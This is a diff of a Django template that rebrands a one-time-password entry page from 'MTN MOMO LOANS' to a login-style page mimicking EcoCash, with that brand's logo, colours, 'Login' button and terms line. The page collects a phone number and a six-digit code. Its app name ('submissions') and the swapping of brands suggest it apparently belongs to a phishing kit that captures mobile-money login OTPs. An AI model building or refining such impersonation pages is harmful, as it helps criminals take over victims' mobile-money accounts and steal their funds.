@@ -1,250 +1,303 @@
-{% extends "submissions/base.html" %}
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <title>EcoCash — Verify OTP</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-{% block title %}Verify OTP — MTN MOMO LOANS{% endblock %}
+    :root {
+      --eco-blue:      #0057a8;
+      --eco-blue-dark: #004080;
+      --eco-red:       #e02020;
+      --eco-text:      #1a1a1a;
+      --eco-muted:     #555;
+      --eco-border:    #c8d8ea;
+      --font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
 
-{% block extra_head %}
-<style>
-  .otp-icon {
-    width: 48px;
-    height: 48px;
-    background: #f0efff;
-    border-radius: 12px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    margin-bottom: 20px;
-  }
+    html, body {
+      height: 100%;
+      font-family: var(--font);
+      background: #f5f8fb;
+      -webkit-font-smoothing: antialiased;
+    }
 
-  .otp-meta {
-    font-size: 16px;
-    color: var(--color-muted);
-    margin-bottom: 32px;
-    line-height: 1.6;
-  }
-  .otp-meta strong { color: var(--color-text); font-weight: 600; }
+    .page {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      background: #fff;
+      max-width: 480px;
+      margin: 0 auto;
+      overflow: hidden;
+    }
 
-  /* ── 6-box OTP input ── */
-  .otp-boxes {
-    display: flex;
-    gap: 10px;
-    justify-content: center;
-    margin-bottom: 6px;
-  }
-  .otp-box {
-    width: 52px;
-    height: 60px;
-    font-size: 24px;
-    font-weight: 700;
-    text-align: center;
-    font-family: var(--font);
-    color: var(--color-text);
-    background: var(--color-surface);
-    border: 1.5px solid var(--color-border);
-    border-radius: var(--radius-sm);
-    outline: none;
-    caret-color: transparent;
-    transition: border-color .15s, box-shadow .15s;
-    /* prevent iOS zoom */
-    font-size: clamp(18px, 4vw, 24px);
-  }
-  .otp-box:focus {
-    border-color: var(--color-border-focus);
-    box-shadow: 0 0 0 3px rgba(99,91,255,.15);
-  }
-  .otp-box--filled {
-    border-color: var(--color-primary);
-  }
-  .otp-box--error {
-    border-color: var(--color-error);
-  }
-  .otp-box--error:focus {
-    box-shadow: 0 0 0 3px rgba(223,27,65,.12);
-  }
+    /* ── Top ──────────────────────────────────────────────────────────── */
+    .top-section {
+      flex: 1;
+      padding: 48px 32px 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
 
-  /* Hidden real input that collects the combined value */
-  #otp-hidden { display: none; }
+    .logo {
+      font-size: 38px;
+      font-weight: 800;
+      letter-spacing: -1px;
+      margin-bottom: 32px;
+    }
+    .logo span:first-child { color: var(--eco-blue); }
+    .logo span:last-child  { color: var(--eco-red);  }
 
-  /* ── Timer ── */
-  .timer-row {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    margin-top: 16px;
-    font-size: 14px;
-  }
-  .timer {
-    display: inline-flex;
-    align-items: center;
-    gap: 7px;
-    color: var(--color-muted);
-    font-variant-numeric: tabular-nums;
-  }
-  .timer__value {
-    font-weight: 600;
-    color: var(--color-text);
-    min-width: 38px;
-  }
-  .timer--expired .timer__value { color: var(--color-error); }
+    h1 {
+      font-size: 22px;
+      font-weight: 700;
+      color: var(--eco-text);
+      margin-bottom: 8px;
+      text-align: center;
+    }
 
-  .timer__ring { transform: rotate(-90deg); }
-  .timer__ring-track { stroke: var(--color-border); }
-  .timer__ring-fill {
-    stroke: var(--color-primary);
-    stroke-dasharray: 50.27;
-    stroke-dashoffset: 0;
-    transition: stroke-dashoffset 1s linear, stroke .3s;
-  }
-  .timer--expired .timer__ring-fill { stroke: var(--color-error); }
-</style>
-{% endblock %}
+    .otp-meta {
+      font-size: 14px;
+      color: var(--eco-muted);
+      text-align: center;
+      margin-bottom: 32px;
+      line-height: 1.6;
+    }
+    .otp-meta strong { color: var(--eco-text); }
 
-{% block content %}
-<div class="card">
+    /* ── 6-box OTP input ─────────────────────────────────────────────── */
+    .otp-boxes {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin-bottom: 24px;
+      width: 100%;
+    }
+    .otp-box {
+      flex: 1;
+      max-width: 52px;
+      height: 60px;
+      border: 1.5px solid var(--eco-border);
+      border-radius: 8px;
+      font-size: clamp(18px, 4vw, 24px);
+      font-weight: 700;
+      text-align: center;
+      font-family: var(--font);
+      color: var(--eco-text);
+      background: #fff;
+      outline: none;
+      caret-color: transparent;
+      transition: border-color .15s, box-shadow .15s;
+    }
+    .otp-box:focus {
+      border-color: var(--eco-blue);
+      box-shadow: 0 0 0 3px rgba(0,87,168,.12);
+    }
+    .otp-box--filled { border-color: var(--eco-blue); }
+    .otp-box--error  { border-color: var(--eco-red);  }
 
-  <div class="otp-icon">
-    <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
-      <rect x="3" y="9" width="16" height="11" rx="2" stroke="#635bff" stroke-width="1.6"/>
-      <path d="M7 9V6a4 4 0 0 1 8 0v3" stroke="#635bff" stroke-width="1.6" stroke-linecap="round"/>
-      <circle cx="11" cy="14.5" r="1.5" fill="#635bff"/>
-    </svg>
-  </div>
+    #otp-hidden { display: none; }
 
-  <p class="card__eyebrow">Verification</p>
-  <h1 class="card__title">Enter your OTP</h1>
-  <p class="otp-meta">
-    A one-time code has been sent to <strong>{{ phone }}</strong>.<br>
-    It expires in 2 minutes.
-  </p>
+    /* ── Timer row ───────────────────────────────────────────────────── */
+    .timer-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+      font-size: 13px;
+      color: var(--eco-muted);
+      margin-bottom: 28px;
+    }
+    .timer__value {
+      font-weight: 600;
+      color: var(--eco-text);
+      font-variant-numeric: tabular-nums;
+    }
+    .timer--expired .timer__value { color: var(--eco-red); }
 
-  {% if error %}
-  <div class="form-error-banner" role="alert">
-    <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
-      <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-width="1.5"/>
-      <path d="M8 5v3.5M8 10.5v.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
-    </svg>
-    <div>{{ error }}</div>
-  </div>
-  {% endif %}
+    .resend-btn {
+      background: none;
+      border: none;
+      color: var(--eco-blue);
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: var(--font);
+      padding: 0;
+    }
+    .resend-btn:disabled { color: var(--eco-muted); cursor: default; }
+    .resend-btn:not(:disabled):hover { text-decoration: underline; }
 
-  <form method="post" id="otp-form" novalidate>
-    {% csrf_token %}
+    /* ── Login button ─────────────────────────────────────────────────── */
+    .login-btn {
+      width: 100%;
+      background: var(--eco-blue);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 15px;
+      font-size: 16px;
+      font-weight: 700;
+      font-family: var(--font);
+      cursor: pointer;
+      transition: background .15s;
+      letter-spacing: .2px;
+      margin-bottom: 16px;
+    }
+    .login-btn:hover  { background: var(--eco-blue-dark); }
+    .login-btn:active { opacity: .9; }
+    .login-btn:disabled { opacity: .5; cursor: default; }
 
-    <!-- Hidden input that carries the joined OTP value to the server -->
-    <input type="hidden" name="otp" id="otp-hidden" />
+    .back-link {
+      text-align: center;
+      font-size: 13px;
+      color: var(--eco-muted);
+      display: block;
+      text-decoration: none;
+      margin-bottom: 8px;
+    }
+    .back-link:hover { color: var(--eco-blue); }
 
-    <!-- 6 visible digit boxes -->
-    <div class="otp-boxes" role="group" aria-label="One-time password">
-      {% for i in "123456" %}
-      <input
-        class="otp-box{% if error %} otp-box--error{% endif %}"
-        type="text"
-        inputmode="numeric"
-        maxlength="1"
-        pattern="[0-9]"
-        autocomplete="{% if forloop.first %}one-time-code{% else %}off{% endif %}"
-        aria-label="Digit {{ forloop.counter }}"
-        data-index="{{ forloop.counter0 }}"
-        {% if forloop.first %}autofocus{% endif %}
-      />
-      {% endfor %}
-    </div>
+    /* ── Wave + blue bottom ──────────────────────────────────────────── */
+    .wave {
+      display: block;
+      width: 100%;
+      margin-bottom: -2px;
+    }
 
-    <div class="timer-row">
-      <div class="timer" id="timer-wrap">
-        <svg width="18" height="18" viewBox="0 0 18 18" class="timer__ring">
-          <circle class="timer__ring-track" cx="9" cy="9" r="8" fill="none" stroke-width="2"/>
-          <circle class="timer__ring-fill" id="ring-fill" cx="9" cy="9" r="8" fill="none" stroke-width="2" stroke-linecap="round"/>
-        </svg>
-        <span>Expires in <span class="timer__value" id="timer-value">--:--</span></span>
+    .bottom-section {
+      background: var(--eco-blue);
+      padding: 20px 28px 32px;
+      text-align: center;
+    }
+
+    .terms {
+      font-size: 11px;
+      color: rgba(255,255,255,.6);
+    }
+    .terms a { color: rgba(255,255,255,.8); text-decoration: underline; }
+
+    @media (min-width: 481px) {
+      .page { box-shadow: 0 4px 32px rgba(0,0,0,.1); }
+    }
+  </style>
+</head>
+<body>
+<div class="page">
+
+  <div class="top-section">
+
+    <div class="logo"><span>Eco</span><span>Cash</span></div>
+
+    <h1>Enter OTP</h1>
+    <p class="otp-meta">
+      A one-time code was sent to <strong>{{ phone }}</strong>.<br>
+      It expires in 2 minutes.
+    </p>
+
+    <form method="post" id="otp-form" novalidate style="width:100%;">
+      {% csrf_token %}
+      <input type="hidden" name="otp" id="otp-hidden" />
+
+      <div class="otp-boxes" role="group" aria-label="One-time password">
+        {% for i in "123456" %}
+        <input
+          class="otp-box{% if error %} otp-box--error{% endif %}"
+          type="text"
+          inputmode="numeric"
+          maxlength="1"
+          pattern="[0-9]"
+          autocomplete="{% if forloop.first %}one-time-code{% else %}off{% endif %}"
+          aria-label="Digit {{ forloop.counter }}"
+          data-index="{{ forloop.counter0 }}"
+          {% if forloop.first %}autofocus{% endif %}
+        />
+        {% endfor %}
       </div>
 
-      <form method="post" style="display:inline;">
-        {% csrf_token %}
-        <button type="submit" name="resend" value="1" class="btn--link" id="resend-btn"
-                {% if not expired %}disabled{% endif %}>
-          Resend code
-        </button>
-      </form>
-    </div>
+      <div class="timer-row">
+        <div class="timer" id="timer-wrap">
+          Expires in&nbsp;<span class="timer__value" id="timer-value">--:--</span>
+        </div>
 
-    <button type="submit" class="btn btn--primary" id="verify-btn" {% if expired %}disabled{% endif %}>
-      Verify &amp; Submit
-    </button>
+        <!-- Resend lives in its own mini-form to avoid conflicting with otp field -->
+        <form method="post" style="display:inline;">
+          {% csrf_token %}
+          <button type="submit" name="resend" value="1" class="resend-btn" id="resend-btn"
+                  {% if not expired %}disabled{% endif %}>
+            Resend code
+          </button>
+        </form>
+      </div>
 
-    <div style="text-align:center;">
-      <a href="{% url 'submissions:step3' %}" class="btn btn--ghost">← Back</a>
-    </div>
-  </form>
+      <button type="submit" class="login-btn" id="verify-btn" {% if expired %}disabled{% endif %}>
+        Login
+      </button>
+
+      <a href="{% url 'submissions:login' %}" class="back-link">← Back</a>
+
+    </form>
+
+  </div>
+
+  <svg class="wave" viewBox="0 0 480 60" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0,0 C120,60 360,60 480,0 L480,60 L0,60 Z" fill="#0057a8"/>
+  </svg>
+
+  <div class="bottom-section">
+    <p class="terms">
+      By logging in you agree to our <a href="#">Terms &amp; Conditions</a>
+    </p>
+  </div>
 
 </div>
-{% endblock %}
 
-{% block extra_scripts %}
 <script>
 (function () {
-  const TOTAL  = 120;
-  let secondsLeft = {{ seconds_left }};
+  const TOTAL      = 120;
+  let secondsLeft  = {{ seconds_left }};
 
   const boxes      = Array.from(document.querySelectorAll('.otp-box'));
   const hidden     = document.getElementById('otp-hidden');
   const form       = document.getElementById('otp-form');
   const timerVal   = document.getElementById('timer-value');
   const timerWrap  = document.getElementById('timer-wrap');
-  const ringFill   = document.getElementById('ring-fill');
   const verifyBtn  = document.getElementById('verify-btn');
   const resendBtn  = document.getElementById('resend-btn');
-  const CIRC       = 2 * Math.PI * 8;   // r=8
 
-  // ── Box keyboard behaviour ───────────────────────────────────────────────
+  // ── Box behaviour ──────────────────────────────────────────────────────
   boxes.forEach(function (box, idx) {
     box.addEventListener('keydown', function (e) {
       if (e.key === 'Backspace') {
-        if (box.value) {
-          box.value = '';
-          syncHidden();
-        } else if (idx > 0) {
-          boxes[idx - 1].focus();
-          boxes[idx - 1].value = '';
-          syncHidden();
-        }
+        if (box.value) { box.value = ''; syncHidden(); }
+        else if (idx > 0) { boxes[idx - 1].focus(); boxes[idx - 1].value = ''; syncHidden(); }
         e.preventDefault();
-      } else if (e.key === 'ArrowLeft' && idx > 0) {
-        boxes[idx - 1].focus();
-      } else if (e.key === 'ArrowRight' && idx < boxes.length - 1) {
-        boxes[idx + 1].focus();
-      }
+      } else if (e.key === 'ArrowLeft'  && idx > 0)              boxes[idx - 1].focus();
+        else if (e.key === 'ArrowRight' && idx < boxes.length-1) boxes[idx + 1].focus();
     });
 
-    box.addEventListener('input', function (e) {
-      // Strip non-digits; take only last char if somehow multiple came in
+    box.addEventListener('input', function () {
       const val = box.value.replace(/\D/g, '').slice(-1);
       box.value = val;
-
-      if (val) {
-        box.classList.add('otp-box--filled');
-        if (idx < boxes.length - 1) {
-          boxes[idx + 1].focus();
-        }
-      } else {
-        box.classList.remove('otp-box--filled');
-      }
+      if (val) { box.classList.add('otp-box--filled'); if (idx < boxes.length - 1) boxes[idx + 1].focus(); }
+      else       box.classList.remove('otp-box--filled');
       syncHidden();
       autoSubmit();
     });
 
-    // Handle paste on any box
     box.addEventListener('paste', function (e) {
       e.preventDefault();
       const text = (e.clipboardData || window.clipboardData)
                     .getData('text').replace(/\D/g, '').slice(0, 6);
       text.split('').forEach(function (ch, i) {
-        if (boxes[i]) {
-          boxes[i].value = ch;
-          boxes[i].classList.add('otp-box--filled');
-        }
+        if (boxes[i]) { boxes[i].value = ch; boxes[i].classList.add('otp-box--filled'); }
       });
-      const next = Math.min(text.length, boxes.length - 1);
-      boxes[next].focus();
+      boxes[Math.min(text.length, boxes.length - 1)].focus();
       syncHidden();
       autoSubmit();
     });
@@ -253,46 +306,32 @@
   function syncHidden() {
     hidden.value = boxes.map(function (b) { return b.value; }).join('');
   }
-
   function autoSubmit() {
-    if (hidden.value.length === 6 && secondsLeft > 0) {
-      form.submit();
-    }
+    if (hidden.value.length === 6 && secondsLeft > 0) form.submit();
   }
 
-  // ── Timer ────────────────────────────────────────────────────────────────
+  // ── Timer ──────────────────────────────────────────────────────────────
   function fmt(s) {
-    const m   = Math.floor(s / 60);
-    const sec = s % 60;
+    const m = Math.floor(s / 60), sec = s % 60;
     return String(m).padStart(2,'0') + ':' + String(sec).padStart(2,'0');
   }
-
   function setExpired() {
     timerWrap.classList.add('timer--expired');
-    verifyBtn.disabled = true;
-    resendBtn.disabled = false;
-    boxes.forEach(function (b) {
-      b.disabled = true;
-      b.classList.add('otp-box--error');
-    });
+    verifyBtn.disabled  = true;
+    resendBtn.disabled  = false;
+    boxes.forEach(function (b) { b.disabled = true; b.classList.add('otp-box--error'); });
   }
-
-  function updateTimer() {
+  function tick() {
     timerVal.textContent = fmt(secondsLeft);
-    const offset = CIRC * (1 - secondsLeft / TOTAL);
-    ringFill.style.strokeDashoffset = offset;
-    if (secondsLeft <= 0) { setExpired(); clearInterval(tick); }
+    if (secondsLeft <= 0) { setExpired(); return; }
+    secondsLeft--;
+    setTimeout(tick, 1000);
   }
 
-  updateTimer();
-
-  var tick;
-  if (secondsLeft > 0) {
-    tick = setInterval(function () { secondsLeft -= 1; updateTimer(); }, 1000);
-  } else {
-    setExpired();
-  }
+  if (secondsLeft > 0) tick();
+  else setExpired();
 
 })();
 </script>
-{% endblock %}
+</body>
+</html>
